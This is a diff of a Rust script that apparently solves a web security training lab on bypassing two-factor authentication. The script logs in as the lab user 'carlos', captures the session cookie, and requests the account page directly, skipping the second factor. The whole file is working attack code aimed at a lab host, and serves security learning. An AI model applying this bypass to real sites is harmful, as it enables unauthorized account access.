@@ -1,115 +1,56 @@
-/****************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 26/8/2023
+/**************************************************************************
 *
 * Lab: 2FA simple bypass
 *
-* Steps: 1. Login as carlos
-*        2. Extract the session from the Set-Cookie header
-*        3. Request /login2 using the extracted session
-*        4. Request /my-account directly bypassing 2FA
+* Hack Steps: 
+*      1. Login as carlos
+*      2. Get the session cookie
+*      3. Fetch the profile page directly bypassing 2FA
+*      4. Extract the name 'carlos' to make sure you logged in as him
 *
-*****************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+***************************************************************************/
+use lazy_static::lazy_static;
 use regex::{self, Regex};
 use reqwest::{
-    blocking::{Client, ClientBuilder},
-    header::HeaderMap,
+    blocking::{Client, ClientBuilder, Response},
     redirect::Policy,
 };
-use std::{
-    collections::HashMap,
-    fs::{self, OpenOptions},
-    io::{self, Write},
-    time::{self, Duration, Instant},
-};
+use std::{collections::HashMap, time::Duration};
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0ace008404c1294d8777e741006d00bb.web-security-academy.net";
+
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
+}
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0aa7007704f85c4e83f0191a00ec00ce.web-security-academy.net";
+    print!("⦗1⦘ Logging in as carlos.. ");
+    let login_as_carlos = login_as_carlos();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Fetching the profile page directly bypassing 2FA.. ");
 
-    // try to login as as carlos
-    let login = client
-        .post(format!("{url}/login"))
-        .form(&HashMap::from([
-            ("username", "carlos"),
-            ("password", "montoya"),
-        ]))
-        .send();
+    let session = get_session_cookie(&login_as_carlos);
+    let carlos_profile = fetch_with_session("/my-account?id=carlos", &session);
 
-    // if login succeeded
-    if let Ok(res) = login {
-        println!("{}", "1. Logged in as carlos.. OK".white().bold());
+    println!("{}", "OK".green());
+    print!("⦗3⦘ Extracting the name 'carlos' to make sure you logged in as him.. ");
 
-        // extract session from cookie header
-        let session = extract_session_cookie(&res.headers());
+    let body = carlos_profile.text().unwrap();
+    let carlos_name = capture_pattern_from_text("Your username is: (carlos)", &body);
 
-        // try to GET /login2 page
-        let login2 = client
-            .get(format!("{url}/login2"))
-            .header("Cookie", format!("session={session}"))
-            .send();
-
-        // if GET /login2 succeeded
-        if let Ok(res2) = login2 {
-            println!(
-                "{}",
-                "2. GET /login2 using extracted session.. OK".white().bold()
-            );
-
-            // try to bypass the 2FA by requsting /my-account directrly
-            let home = client
-                .get(format!("{url}/my-account?id=carlos"))
-                .header("Cookie", format!("session={session}"))
-                .send();
-
-            // if bypass succeeded
-            if let Ok(home_res) = home {
-                println!(
-                    "{}",
-                    "3. GET /my-account directly bypassing 2FA.. OK"
-                        .white()
-                        .bold()
-                );
-
-                // search for name carlos in the body
-                let body = home_res.text().unwrap();
-                let carlos_name = extract_pattern("Your username is: (carlos)", &body);
-
-                // check if the name exist
-                if carlos_name.len() != 0 {
-                    println!("{}", "✅ Logged in successfully as Carlos".green().bold());
-                } else {
-                    println!("{}", "Failed to login as Carlos".red().bold());
-                }
-            } else {
-                println!("{}", "Couldn't get login2 page".red().bold());
-            }
-        } else {
-            println!("{}", "Couldn't get login2 page".red().bold());
-        }
+    if carlos_name.len() != 0 {
+        println!("{}", "OK".green());
+        println!("🗹 Logged in successfully as carlos");
+        println!("🗹 The lab should be marked now as {}", "solved".green())
     } else {
-        println!("{}", "Login failed".red().bold());
+        println!("{}", "Failed to login as Carlos".red());
     }
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -117,24 +58,36 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*******************************************************************
-* Function to extract session field from the cookie header
-********************************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> String {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    extract_pattern("session=(.*); Secure", cookie)
+fn login_as_carlos() -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .form(&HashMap::from([
+            ("username", "carlos"),
+            ("password", "montoya"),
+        ]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to login as carlos".red()))
 }
 
-/****************************************************
-* Function to extract a pattern form a text
-*****************************************************/
-fn extract_pattern(pattern: &str, text: &str) -> String {
-    Regex::new(pattern)
-        .unwrap()
-        .captures(text)
-        .unwrap()
-        .get(1)
-        .unwrap()
-        .as_str()
-        .to_string()
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
 }
